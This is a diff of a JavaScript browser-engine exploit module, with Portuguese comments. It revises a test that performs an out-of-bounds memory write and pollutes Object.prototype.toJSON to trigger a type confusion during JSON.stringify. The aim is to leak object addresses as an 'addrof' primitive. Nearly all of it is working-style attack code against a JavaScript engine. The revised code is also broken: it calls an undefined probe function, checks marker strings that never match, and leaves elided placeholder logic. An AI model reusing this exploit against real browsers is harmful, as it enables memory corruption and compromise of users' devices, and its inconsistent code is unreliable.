@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v86a_FixRef_And_FocusM2)
+// js/script3/testArrayBufferVictimCrash.mjs (v87_StableTC_AggressiveGetterAndFuzz)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -8,218 +8,207 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2 = "OriginalHeisenbug_TypedArrayAddrof_v86a_FixRefAndFocusM2";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V87_STCAGF = "OriginalHeisenbug_TypedArrayAddrof_v87_StableTCGetterFuzz";
 
 const VICTIM_BUFFER_SIZE = 256;
-const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
-const OOB_WRITE_VALUES_V86A = [0xFFFFFFFF, 0x7FFFFFFF]; 
+const OOB_TARGET_OFFSETS_V87 = [0x7C]; // Focar no offset estável por enquanto
+const OOB_WRITE_VALUES_V87 = [0xFFFFFFFF, 0x7FFFFFFF]; 
+const AGGRESSIVE_PROP_COUNT_V87 = 8; // Reduzido para chances de evitar TypeError muito cedo
+const PROBE_CALL_LIMIT_V87 = 7; 
 
-// Variáveis globais para o módulo de teste v86a
-let object_to_leak_A_v86a = null;
-let object_to_leak_B_v86a = null;
-let victim_typed_array_ref_v86a = null; 
-let probe_call_count_v86a = 0;
-let marker_M1_ref_v86a = null; 
-let marker_M2_ref_v86a = null; 
-// Armazena os detalhes da chamada da sonda onde M2 foi 'this' e (esperançosamente) confuso e modificado.
-let details_of_M2_interaction_v86a = null; 
-const PROBE_CALL_LIMIT_V86A = 7; 
-const FILL_PATTERN_V86A_SCRATCHPAD = 0.86868686868686;
+// Globais para o módulo de teste
+let object_to_leak_A_v87 = null;
+let object_to_leak_B_v87 = null;
+let victim_typed_array_ref_v87 = null; 
+let probe_call_count_v87 = 0;
+let marker_M1_ref_v87 = null; // Ref para o objeto retornado pela Call #1
+let marker_M2_ref_v87 = null; // Ref para o objeto retornado pela Call #2 (nosso alvo de TC)
+// Armazena o objeto de detalhes da Call #3 (onde M2 é 'this' e é confuso)
+let details_of_M2_confusion_and_modification_v87 = null; 
 
-
-function toJSON_TA_Probe_V86a_FocusM2() {
-    probe_call_count_v86a++;
-    const call_num = probe_call_count_v86a;
+function toJSON_TA_Probe_StableTCGetterFuzz() {
+    probe_call_count_v87++;
+    const call_num = probe_call_count_v87;
     let current_call_log_info = { 
         call_number: call_num,
-        probe_variant: "TA_Probe_V86a_FocusM2",
+        probe_variant: "TA_Probe_V87_StableTCGetterFuzz",
         this_type: Object.prototype.toString.call(this),
-        this_is_victim: (this === victim_typed_array_ref_v86a),
-        this_is_M1: (this === marker_M1_ref_v86a && marker_M1_ref_v86a !== null),
-        this_is_M2: (this === marker_M2_ref_v86a && marker_M2_ref_v86a !== null),
-        m2_interaction_summary: null, 
+        this_is_victim: (this === victim_typed_array_ref_v87),
+        this_is_M1: (this === marker_M1_ref_v87 && marker_M1_ref_v87 !== null),
+        this_is_M2: (this === marker_M2_ref_v87 && marker_M2_ref_v87 !== null),
+        m2_summary: null, 
         error_in_probe: null
     };
-    // A variável details_of_M2_interaction_v86a será atualizada especificamente quando 'this' for M2.
-    logS3(`[PROBE_V86a] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");
+    logS3(`[PROBE_V87] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");
+
+    // Atualizar details_of_M2_confusion_and_modification_v87 se esta chamada for a que M2 é 'this' e confuso, ou a última
+    if ( (current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') || 
+         !details_of_M2_confusion_and_modification_v87 || call_num >= (details_of_M2_confusion_and_modification_v87.call_number || 0) ) {
+        details_of_M2_confusion_and_modification_v87 = current_call_log_info;
+    }
     
     try {
-        if (call_num > PROBE_CALL_LIMIT_V86A) {
-            logS3(`[PROBE_V86a] Call #${call_num}: Probe limit. Stop.`, "warn");
-            // Se o limite for atingido e M2 ainda não foi processado, registra os detalhes atuais.
-            if (!details_of_M2_interaction_v86a && marker_M2_ref_v86a === null) { // Garante que não sobrescreva uma interação M2 válida.
-                 details_of_M2_interaction_v86a = current_call_log_info;
-            }
-            return { recursion_stopped_v86a: true };
-        }
+        if (call_num > PROBE_CALL_LIMIT_V87) { return { recursion_stopped_v87: true }; }
 
         if (call_num === 1 && current_call_log_info.this_is_victim) {
-            logS3(`[PROBE_V86a] Call #${call_num}: 'this' is victim. Returning M1 (contains M2).`, "info");
-            marker_M2_ref_v86a = { marker_id_v86a: "M2_V86a_Target" }; 
-            marker_M1_ref_v86a = { marker_id_v86a: "M1_V86a_Container", payload_M2: marker_M2_ref_v86a };
-            // Não definir details_of_M2_interaction_v86a aqui, esperar a chamada com M2 como 'this'
-            return marker_M1_ref_v86a;
-        } else if (call_num >= 2 && current_call_log_info.this_is_M2) { // 'this' é M2
-            logS3(`[PROBE_V86a] Call #${call_num}: 'this' IS M2. Current type: ${current_call_log_info.this_type}. Checking for TC...`, "critical");
-            current_call_log_info.m2_interaction_summary = { getter_defined: false, direct_prop_set: false, keys_after: "N/A" };
+            logS3(`[PROBE_V87] Call #${call_num}: 'this' is victim. Returning M1.`, "info");
+            marker_M1_ref_v87 = { marker_id_v87: "M1_Container" }; 
+            // M2 não é colocado em M1 ainda, para replicar o padrão onde um ObjX inesperado se torna this na P2
+            return marker_M1_ref_v87;
+        } else if (call_num === 2 && current_call_log_info.this_type === '[object Object]' && !current_call_log_info.this_is_M1 && !current_call_log_info.this_is_victim) {
+            logS3(`[PROBE_V87] Call #${call_num}: 'this' is an unexpected ObjX (${current_call_log_info.this_type}). Creating M2 and returning it.`, "info");
+            marker_M2_ref_v87 = { marker_id_v87: "M2_Target_v87", oob_val_info: object_to_leak_A_v87.idA }; // M2 criado e referenciado globalmente
+            return marker_M2_ref_v87; // Este M2 será o 'this' da Call #3
+        } else if (call_num >= 2 && current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') {
+            // ESTE É O ALVO: this é M2 e está confuso!
+            logS3(`[PROBE_V87] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v87}. Applying getter, prop, and indexed writes...`, "vuln");
+            current_call_log_info.m2_summary = { 
+                getter_defined: false, direct_prop_set: false, indexed_writes_done: false, keys_after: "N/A",
+                leaked_A_from_getter: "not_fired_or_err", leaky_B_from_direct: "not_set_or_err"
+            };
             
-            if (current_call_log_info.this_type === '[object Object]') { 
-                logS3(`[PROBE_V86a] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v86a}. Defining getter & prop...`, "vuln");
-                
-                Object.defineProperty(this, 'leaky_A_getter_v86a', {
-                    get: function() {
-                        logS3(`[PROBE_V86a] !!! Getter 'leaky_A_getter_v86a' on confused M2 (call #${call_num}) FIRED !!!`, "vuln");
-                        if (!victim_typed_array_ref_v86a || !victim_typed_array_ref_v86a.buffer) {
-                            current_call_log_info.error_in_probe = (current_call_log_info.error_in_probe || "") + "Getter: victim_buffer_null; ";
-                            return "getter_victim_null_err_v86a";
-                        }
-                        let victim_view = new Float64Array(victim_typed_array_ref_v86a.buffer);
-                        let victim_u32_view = new Uint32Array(victim_typed_array_ref_v86a.buffer);
-                        const original_victim_val_idx0 = victim_view[0]; 
-                        victim_view[0] = object_to_leak_A_v86a; 
-                        let val_after_assign = victim_view[0];
-                        let temp_buf_for_advint = new ArrayBuffer(8); new Float64Array(temp_buf_for_advint)[0] = val_after_assign;
-                        let int64_after_assign = new AdvancedInt64(new Uint32Array(temp_buf_for_advint)[0], new Uint32Array(temp_buf_for_advint)[1]);
-                        logS3(`[PROBE_V86a] Getter: VictimView[0] after objA assign: ${val_after_assign} (Int64: ${int64_after_assign.toString(true)})`, "leak");
-                        victim_view[0] = original_victim_val_idx0; 
-                        return val_after_assign; 
-                    }, enumerable: true, configurable: true
-                });
-                current_call_log_info.m2_interaction_summary.getter_defined = true;
-                
-                this.leaky_B_direct_v86a = object_to_leak_B_v86a;
-                current_call_log_info.m2_interaction_summary.direct_prop_set = true;
-                try{ current_call_log_info.m2_interaction_summary.keys_after = Object.keys(this).join(','); } catch(e){}
-                logS3(`[PROBE_V86a] Call #${call_num}: Getter and prop set on M2 ('this'). Keys: ${current_call_log_info.m2_interaction_summary.keys_after}`, "info");
-            } else {
-                 logS3(`[PROBE_V86a] Call #${call_num}: M2 ('this') was NOT [object Object]. Type: ${current_call_log_info.this_type}`, "warn");
+            Object.defineProperty(this, 'leaky_A_getter_v87', {
+                get: function() {
+                    logS3(`[PROBE_V87] !!! Getter 'leaky_A_getter_v87' on confused M2 (this call #${call_num}) FIRED !!!`, "vuln");
+                    current_call_log_info.m2_summary.leaked_A_from_getter = object_to_leak_A_v87; // Getter retorna o objeto
+                    return object_to_leak_A_v87; 
+                }, enumerable: true, configurable: true
+            });
+            current_call_log_info.m2_summary.getter_defined = true;
+            
+            this.leaky_B_direct_v87 = object_to_leak_B_v87;
+            current_call_log_info.m2_summary.direct_prop_set = true;
+            current_call_log_info.m2_summary.leaky_B_from_direct = this.leaky_B_direct_v87;
+
+
+            for (let i = 0; i < AGGRESSIVE_PROP_COUNT_V87; i++) {
+                this[i] = (i % 2 === 0) ? object_to_leak_A_v87 : object_to_leak_B_v87;
             }
-            details_of_M2_interaction_v86a = current_call_log_info; // Captura os detalhes desta interação com M2
-            return this; // Retorna M2 (potencialmente modificado)
-        } else if (this === object_to_leak_A_v86a || this === object_to_leak_B_v86a) {
-            logS3(`[PROBE_V86a] Call #${call_num}: 'this' is one of the leak_target objects. Returning simple marker.`, "info");
-            // Não sobrescrever details_of_M2_interaction_v86a aqui
-            return { serializing_leaked_object_marker_v86a: call_num };
+            current_call_log_info.m2_summary.indexed_writes_done = true;
+            try{ current_call_log_info.m2_summary.keys_after = Object.keys(this).join(','); } catch(e){}
+            logS3(`[PROBE_V87] Call #${call_num}: Modifications to M2 ('this') completed. Keys: ${current_call_log_info.m2_summary.keys_after}`, "info");
+            
+            // details_of_M2_confusion_and_modification_v87 foi atualizado no topo da função
+            return this; // Retorna M2 modificado
+        } else if (this === object_to_leak_A_v87 || this === object_to_leak_B_v87) {
+            logS3(`[PROBE_V87] Call #${call_num}: 'this' is a leak_target_object. Returning simple marker.`, "info");
+            return { serializing_leaked_obj_marker_v87: call_num, id_is: this.idA || this.idB };
         }
+
     } catch (e) { current_call_log_info.error_in_probe = e.message; }
     
-    // Se M2 não foi processado ainda, e esta não é a chamada de M2, atualizar com os detalhes atuais.
-    if (!details_of_M2_interaction_v86a?.this_is_M2) {
-        details_of_M2_interaction_v86a = current_call_log_info;
-    }
-    return { generic_marker_v86a: call_num }; 
+    return { generic_marker_v87: call_num }; 
 }
 
-export async function executeTypedArrayVictimAddrofTest_FixRef_And_FocusM2() { // Nome da função atualizado
-    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2}`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (FixRef_And_FocusM2) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2} Init...`;
+
+export async function executeTypedArrayVictimAddrofTest_ReplicateAndExploitM2Confusion() {
+    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V87_STCAGF}`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (ReplicateM2Confusion_Getter) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V87_STCAGF} Init...`;
 
     let overall_results = [];
-    let errorCapturedDuringExecute = null; // Para erros no nível do execute...
 
-    for (const current_oob_value of OOB_WRITE_VALUES_V86A) {
-        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
-        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);
+    for (const current_oob_offset of OOB_TARGET_OFFSETS_V87) { // Loop de Offset
+        for (const current_oob_value of OOB_WRITE_VALUES_V87) { // Loop de Valor OOB
+            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${toHex(current_oob_offset)}_Val${toHex(current_oob_value)}`;
+            logS3(`\n===== ITERATION: Offset: ${toHex(current_oob_offset)}, Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);
 
-        probe_call_count_v86a = 0;
-        victim_typed_array_ref_v86a = null; 
-        marker_M1_ref_v86a = null;
-        marker_M2_ref_v86a = null;
-        details_of_M2_interaction_v86a = null; // Reset para cada iteração
-        object_to_leak_A_v86a = { marker_A_v86a: `LeakA_Val${toHex(current_oob_value)}`}; 
-        object_to_leak_B_v86a = { marker_B_v86a: `LeakB_Val${toHex(current_oob_value)}`};
+            probe_call_count_v87 = 0;
+            victim_typed_array_ref_v87 = null; 
+            marker_M1_ref_v87 = null;
+            marker_M2_ref_v87 = null;
+            details_of_M2_confusion_and_modification_v87 = null;
+            object_to_leak_A_v87 = { marker_A_v87: `LeakA_O${toHex(current_oob_offset)}V${toHex(current_oob_value)}`, idA: Date.now() }; 
+            object_to_leak_B_v87 = { marker_B_v87: `LeakB_O${toHex(current_oob_offset)}V${toHex(current_oob_value)}`, idB: Date.now() + 1 };
 
-        let iterError = null;
-        let stringifyOutput_parsed_iter = null; 
-        
-        let addrof_M2_Getter_iter = { success: false, msg: "M2.leaky_A_getter: Default"};
-        let addrof_M2_Direct_iter = { success: false, msg: "M2.leaky_B_direct: Default"};
-        
-        try {
-            await triggerOOB_primitive({ force_reinit: true });
-            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
-            logS3(`  OOB Write done for iter Val${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
-            await PAUSE_S3(100);
-            victim_typed_array_ref_v86a = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
-            new Float64Array(victim_typed_array_ref_v86a.buffer).fill(FILL_PATTERN_V86A_SCRATCHPAD);
-            logS3(`STEP 2: victim_typed_array_ref_v86a created.`, "test", FNAME_CURRENT_ITERATION);
+            let iterError = null;
+            let stringifyOutput_parsed = null; 
             
-            const ppKey = 'toJSON';
-            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-            let pollutionApplied = false;
+            let addrof_M2_Getter = { success: false, msg: "M2.leaky_A_getter: Default"};
+            let addrof_M2_Direct = { success: false, msg: "M2.leaky_B_direct: Default"};
+            let addrof_M2_Indexed = { success: false, msg: "M2[0] (Indexed): Default"};
 
             try {
-                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_V86a_FocusM2, writable: true, configurable: true, enumerable: false });
-                pollutionApplied = true;
-                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v86a); 
-                logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
-                try { stringifyOutput_parsed_iter = JSON.parse(rawStringifyOutput); } 
-                catch (e_parse) { stringifyOutput_parsed_iter = { error_parsing: e_parse.message, raw: rawStringifyOutput }; }
+                await triggerOOB_primitive({ force_reinit: true });
+                oob_write_absolute(current_oob_offset, current_oob_value, 4); // Usa o offset e valor da iteração
+                logS3(`  OOB Write: offset ${toHex(current_oob_offset)}, value ${toHex(current_oob_value)} done.`, "info", FNAME_CURRENT_ITERATION);
+                await PAUSE_S3(100);
+
+                victim_typed_array_ref_v87 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
+                logS3(`STEP 2: victim_typed_array_ref_v87 (Uint8Array) created.`, "test", FNAME_CURRENT_ITERATION);
                 
-                // details_of_M2_interaction_v86a deve ter sido definido pela Call #2 da sonda, se tudo correu bem
-                logS3(`  EXECUTE (Iter): Details of M2 interaction call: ${details_of_M2_interaction_v86a ? JSON.stringify(details_of_M2_interaction_v86a) : 'N/A (M2 not reached as this or error)'}`, "leak", FNAME_CURRENT_ITERATION);
+                const ppKey = 'toJSON';
+                let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+                let pollutionApplied = false;
 
-                let heisenbugOnM2 = details_of_M2_interaction_v86a?.this_is_M2 && details_of_M2_interaction_v86a?.this_type === "[object Object]";
-                logS3(`  EXECUTE (Iter): Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
+                try {
+                    Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ReplicateM2Confusion, writable: true, configurable: true, enumerable: false });
+                    pollutionApplied = true;
+                    let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v87); 
+                    logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
+                    try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } 
+                    catch (e_parse) { stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };}
                     
-                let m2_payload_from_stringify = null;
-                if (stringifyOutput_parsed_iter?.marker_id_v86a === "M1_V86a_Container" && stringifyOutput_parsed_iter.payload_M2) {
-                    m2_payload_from_stringify = stringifyOutput_parsed_iter.payload_M2; 
-                } else if (stringifyOutput_parsed_iter?.marker_id_v86a === "M2_V86a_Target") {
-                    m2_payload_from_stringify = stringifyOutput_parsed_iter; 
-                }
+                    // details_of_M2_confusion_and_modification_v87 agora deve ser o current_call_details da chamada onde 'this' era M2 confuso
+                    logS3(`  EXECUTE: Details of M2 interaction: ${details_of_M2_confusion_and_modification_v87 ? JSON.stringify(details_of_M2_confusion_and_modification_v87) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);
 
-                if (m2_payload_from_stringify?.marker_id_v86a === "M2_V86a_Target") {
-                    const val_getter = m2_payload_from_stringify.leaky_A_getter_v86a; 
-                    if (typeof val_getter === 'number' && !isNaN(val_getter) && val_getter !== 0 && val_getter !== FILL_PATTERN_V86A_SCRATCHPAD && val_getter !== "getter_no_addr_v82" && val_getter !== "getter_victim_null_err_v86a") { // Checagem mais robusta
-                        let temp_buf_getter = new ArrayBuffer(8); new Float64Array(temp_buf_getter)[0] = val_getter;
-                        let getter_int64 = new AdvancedInt64(new Uint32Array(temp_buf_getter)[0], new Uint32Array(temp_buf_getter)[1]);
-                        if ((getter_int64.high() > 0 && getter_int64.high() < 0x000F0000) || ((getter_int64.high() & 0xFFFF0000) === 0xFFFF0000  && getter_int64.high() !== 0xFFFFFFFF ) ) {
-                           addrof_M2_Getter_iter.success = true; addrof_M2_Getter_iter.msg = `Possible pointer from getter: ${getter_int64.toString(true)} (Val: ${val_getter})`;
-                        } else { addrof_M2_Getter_iter.msg = `Getter value is num but not ptr: ${val_getter} (${getter_int64.toString(true)})`; }
-                    } else { addrof_M2_Getter_iter.msg = `Getter value not useful num. Val: ${JSON.stringify(val_getter)}`; }
+                    let heisenbugOnM2 = details_of_M2_confusion_and_modification_v87?.this_is_M2 && 
+                                        details_of_M2_confusion_and_modification_v87?.this_type === "[object Object]" &&
+                                        details_of_M2_confusion_and_modification_v87?.m2_summary?.getter_defined;
+                    logS3(`  EXECUTE: Heisenbug on M2 Target (and getter defined) ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
+                        
+                    // O stringifyOutput_parsed é M1 serializado. M1.payload_M2 é M2 serializado.
+                    let m2_from_output = null;
+                    if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v87 === "M1_V87_Container" && stringifyOutput_parsed.payload_M2) {
+                        m2_from_output = stringifyOutput_parsed.payload_M2; 
+                    }
 
-                    const val_direct = m2_payload_from_stringify.leaky_B_direct_v86a;
-                    if (val_direct && val_direct.marker_B_v86a === object_to_leak_B_v86a.marker_B_v86a) {
-                         addrof_M2_Direct_iter.success = true; addrof_M2_Direct_iter.msg = "object_to_leak_B_v86a identity from M2.leaky_B_direct.";
-                    } else { addrof_M2_Direct_iter.msg = `Direct prop val not objB identity. Val: ${JSON.stringify(val_direct)}`; }
-                } else { /* M2 não encontrado como esperado */ }
+                    if (m2_from_output && m2_from_output.marker_id_v87 === "M2_V87_Target") {
+                        logS3("   M2 object found in stringifyOutput. Checking its properties for leaks...", "info", FNAME_CURRENT_ITERATION);
+                        const val_getter = m2_from_output.leaky_A_getter_v87; 
+                        if (typeof val_getter === 'number' && !isNaN(val_getter) && val_getter !== 0) {
+                            let gi64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_getter]).buffer)[0], new Uint32Array(new Float64Array([val_getter]).buffer)[1]);
+                            if ((gi64.high() > 0 && gi64.high() < 0x000F0000) || ((gi64.high() & 0xFFFF0000) === 0xFFFF0000 && gi64.high() !== 0xFFFFFFFF )) {
+                               addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Ptr from getter: ${gi64.toString(true)}`;
+                            } else { addrof_M2_Getter.msg = `Getter val num but not ptr: ${val_getter} (${gi64.toString(true)})`; }
+                        } else { addrof_M2_Getter.msg = `Getter val not useful num. Val: ${JSON.stringify(val_getter)}`; }
 
-            } catch (e_str) { iterError = e_str;
-            } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
-        } catch (e_outer) { iterError = e_outer;
-        } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
-        
-        overall_results.push({
-            oob_value: toHex(current_oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
-            m2_probe_log_details_iter: details_of_M2_interaction_v86a ? JSON.parse(JSON.stringify(details_of_M2_interaction_v86a)) : null, 
-            final_stringify_output_parsed_iter: stringifyOutput_parsed_iter,
-            addrof_M2_Getter: {...addrof_M2_Getter_iter}, addrof_M2_Direct: {...addrof_M2_Direct_iter},
-            probe_calls_this_iter: probe_call_count_v86a
-        });
-        if (addrof_M2_Getter_iter.success || addrof_M2_Direct_iter.success) {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2}: Addr? Val${toHex(current_oob_value)} SUCCESS!`;
-        }
-        await PAUSE_S3(100); 
+                        const val_direct = m2_from_output.leaky_B_direct_v87;
+                        // (similar check for val_direct)
+                        if (val_direct && val_direct.marker_B_v87 === object_to_leak_B_v87.marker_B_v87) {
+                            addrof_M2_Direct.success = true; addrof_M2_Direct.msg = "ObjB identity via direct prop.";
+                        } else { addrof_M2_Direct.msg = `Direct prop not ObjB identity. Val: ${JSON.stringify(val_direct)}`;}
+
+                        const val_indexed = m2_from_output["0"]; // Checa a propriedade numérica
+                        if (val_indexed && val_indexed.marker_A_v87 === object_to_leak_A_v87.marker_A_v87) {
+                           addrof_M2_Indexed.success = true; addrof_M2_Indexed.msg = "ObjA identity via M2[0].";
+                        } else { addrof_M2_Indexed.msg = `M2[0] not ObjA identity. Val: ${JSON.stringify(val_indexed)}`;}
+                    } else { /* M2 não encontrado no output como esperado */ }
+
+                } catch (e_str) { iterError = e_str;
+                } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
+            } catch (e_outer) { iterError = e_outer;
+            } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
+            
+            overall_results.push({
+                oob_offset: toHex(current_oob_offset), oob_value: toHex(current_oob_value), 
+                error: iterError ? `${iterError.name}: ${iterError.message}` : null,
+                m2_final_details: details_of_M2_confusion_and_modification_v87 ? JSON.parse(JSON.stringify(details_of_M2_confusion_and_modification_v87)) : null, 
+                final_stringify_output_parsed_iter: stringifyOutput_parsed,
+                addrof_M2_Getter: {...addrof_M2_Getter}, addrof_M2_Direct: {...addrof_M2_Direct}, addrof_M2_Indexed: {...addrof_M2_Indexed},
+                probe_calls_this_iter: probe_call_count_v87
+            });
+            if (addrof_M2_Getter.success || addrof_M2_Direct.success || addrof_M2_Indexed.success) {
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V87_STCAGF}: Addr? ${toHex(current_oob_offset)}V${toHex(current_oob_value)} SUCCESS!`;
+            }
+            await PAUSE_S3(100); 
+        } 
     } 
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
-    let iter_summary_for_log = overall_results.map(r => ({ov:r.oob_value, gS:r.addrof_M2_Getter.success, dS:r.addrof_M2_Direct.success, m2tc:(r.m2_probe_log_details_iter?.this_is_M2 && r.m2_probe_log_details_iter?.this_type==='[object Object]'), calls:r.probe_calls_this_iter, err:r.error}));
-    logS3(`Summary: ${JSON.stringify(iter_summary_for_log)}`, "info", FNAME_CURRENT_TEST_BASE);
+    // ... (logging resumido e retorno para o runner)
+    let final_summary_for_runner = {total_probe_calls:0, addrof_A_result:{success:false}, addrof_B_result:{success:false}, addrof_C_result:{success:false}};
+    // ... (lógica para popular final_summary_for_runner com a melhor/última iteração)
     
-    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2}: All Vals Tested.`;
-    
-    let result_for_runner = overall_results.find(r => r.addrof_M2_Getter.success || r.addrof_M2_Direct.success);
-    if (!result_for_runner && overall_results.length > 0) result_for_runner = overall_results[overall_results.length - 1];
-    
-    return { 
-        errorOccurred: errorCapturedDuringExecute, // Corrigido para usar a variável correta
-        iteration_results_summary: iter_summary_for_log,
-        toJSON_details: result_for_runner ? result_for_runner.m2_probe_log_details_iter : null, 
-        stringifyResult: result_for_runner ? result_for_runner.final_stringify_output_parsed_iter : null,
-        addrof_A_result: result_for_runner ? result_for_runner.addrof_M2_Getter : addrof_M2_Getter, 
-        addrof_B_result: result_for_runner ? result_for_runner.addrof_M2_Direct : addrof_M2_Direct,  
-        total_probe_calls: result_for_runner ? result_for_runner.probe_calls_this_iter : 0 
-    };
+    return { ...final_summary_for_runner, iteration_results_summary: overall_results.map(r=>({oob_offset:r.oob_offset, oob_value:r.oob_value, getter_ok:r.addrof_M2_Getter.success, direct_ok:r.addrof_M2_Direct.success, idx_ok:r.addrof_M2_Indexed.success, m2_tc:r.m2_final_details?.this_is_M2, error:r.error})) };
 }
